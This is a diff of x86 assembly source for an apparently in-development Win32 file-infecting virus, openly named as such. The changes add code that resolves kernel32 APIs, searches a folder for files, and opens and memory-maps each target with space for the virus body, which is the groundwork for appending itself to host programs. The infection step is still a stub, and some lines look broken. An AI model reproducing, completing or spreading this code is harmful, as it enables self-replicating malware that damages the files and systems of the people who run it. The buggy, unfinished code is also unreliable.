@@ -19,6 +19,7 @@ FindNextFileError               		BYTE                        "FindNextFile fail
 FindNextFileSuccess             		BYTE                        "FirstNextFile found with success ", 0
 FolderFound           		  		BYTE                        "Folder found", 0
 PATH							db				    "C:\Documents and Settings\Administrator\Desktop\virus\",0
+virus_size equ (virus_end-virusCode)
 .code
 ; -----------------------------------;
 virusCode:
@@ -32,7 +33,6 @@ delta:
 	sub eax,offset delta - offset virusCode
 	sub eax,00001000h
 	mov [ebp+image_base],eax			; save image base
-
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;------------Find import section-------------;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -127,7 +127,7 @@ find_API:
 	call [ebp+VirtualProtectAddress]
 	
 find_first_file:
-	lea eax,[ebp+ offset Win32Data]
+	lea eax,[ebp+offset win32_find_data]
 	push eax
 	lea eax,[ebp+offset search_mask]
 	push eax
@@ -136,41 +136,89 @@ find_next_file:
 	cmp eax,0
 	je done_find
 	mov dword ptr[ebp+search_handle],eax
-	lea eax,[ebp+FileName]
+	;call infect_file
+	lea eax,[ebp+win32_find_data.FileName]
 	xor eax,eax
-	;mov ecx,260H
-	;xor al,al
-	;rep stosb
-	
-	lea eax,[ebp+ offset Win32Data]
+	lea eax,[ebp+ offset win32_find_data]
 	push eax
-	;lea eax,offset search_handle
-	;add eax,ebp
-	;mov eax,dword ptr[ebp+search_handle]
-	;push eax
 	push dword ptr[ebp+search_handle]
 	call [ebp+FindNextFileAAddress]
 	jmp find_next_file
 close_file_handle:
-	;push dword[ebp+search_handle]
+	push dword ptr[ebp+search_handle]
+	call [ebp+CloseHandleAddress]
 done_find:
 	ret
 infect_file:
-    call open_file
-    ret
+    	call open_file
+    	cmp eax,0
+    	je open_fail
+    	call create_file_mapping
+    	cmp eax,0
+    	je create_file_mapping_fail
+    	call map_into_mem
+    	cmp eax,0
+    	je map_into_mem_fail
+    
+    	call get_host_data
+map_into_mem_fail:
+    	call unmap_into_mem
+create_file_mapping_fail:
+   	 call uncreate_file_mapping
+open_fail:
+   	 call uncreate_file_handle
+  	 ret
+get_host_data:
+ 	;;
 open_file:
-    ;push dword 0 
-    ;push dword 0x80
-    ;push dword 3
-    ;push dword 0 
-    ;push dword 01
-    ;push dword 0xc0000000
-    ;mov eax,[ebp+FileName] 
-    add eax,ebp
-    push eax 
-    ;call [ebp+CreateFileAAdd]        ;Gets the File Handle for use in CreateFileMapping
-    mov dword ptr[ebp+file_handle],eax 
-    ret		
+    	push 0h 
+    	push 80h
+    	push 3h
+   	push 0h 
+    	push 01h
+   	push 80000000h
+    	lea eax,[ebp+win32_find_data.FileName] 
+    	add eax,ebx
+    	push eax 
+    	call [ebp+CreateFileAAddress]        ;Gets the File Handle for use in CreateFileMapping
+    	mov dword ptr[ebp+file_handle],eax 
+   	 ret
+create_file_mapping:
+    	push ecx
+    	mov ecx,[ebp+virus_size]
+    	add ecx,[ebp+win32_find_data.FileSizeLow]
+    	push 0
+    	push ecx
+    	push 0
+    	push 4
+    	push 0
+    	push dword ptr[ebp+file_handle]
+    	call [ebp+CreateFileMappingAAddress]
+    	mov dword ptr[ebp+file_map_handle],eax
+    	pop ecx
+    	ret
+map_into_mem:
+    	push dword ptr[ebp+win32_find_data.FileSizeHigh]
+    	push 0
+    	push 0
+    	push 02
+    	push eax
+    	call [ebp+MapViewOfFileAAddress]
+    	mov dword ptr[ebp+mem_map_handle],eax
+    	ret
+unmap_into_mem:
+    	push dword ptr[ebp+mem_map_handle]
+    	call [ebp+UnmapViewOfFileAddress]
+    	ret
+uncreate_file_mapping:
+    	push dword ptr[ebp+file_map_handle]
+    	call [ebp+CloseHandleAddress]
+    	ret
+uncreate_file_handle:
+    	push dword ptr[ebp+file_handle]
+   	call [ebp+CloseHandleAddress]
+    	ret
+		
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;---------------------------Check kernel32 function----------------------------------------;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;			
@@ -374,9 +422,8 @@ virtual_out    				dd    0h
 search_handle    				dd    0h
 host_rel_tab    				dd    0h
 host_new_entry    			dd    0h    
-
-Win32Data:
-      FileAttributes           	dd 0              ;attributes
+Win32FindData struct
+	FileAttributes           	dd 0              ;attributes
       CreationTime             	dd 0,0            ;time of creation
       LastAccessTime           	dd 0,0            ;last access time
       LastWriteTime            	dd 0,0            ;last modification
@@ -386,7 +433,8 @@ Win32Data:
       Reserved1                	dd 0
       FileName                 	db 260 dup(?)         ;long filename
       AlternateFileName        	db 13  dup(?)         ;short filename
-
+Win32FindData ends
+	win32_find_data Win32FindData {}
 APIName:
 	FindFirstFileAStr    		db    "FindFirstFileA", 0 
 	FindNextFileAStr    		db    "FindNextFileA", 0 
@@ -411,5 +459,5 @@ APIAddress:
 	CloseHandleAddress        		dd    0h
 	VirtualProtectAddress    		dd    0h
 	SetCurrentDirectoryAddress 		dd    0h
-
+virus_end:	
 end virusCode
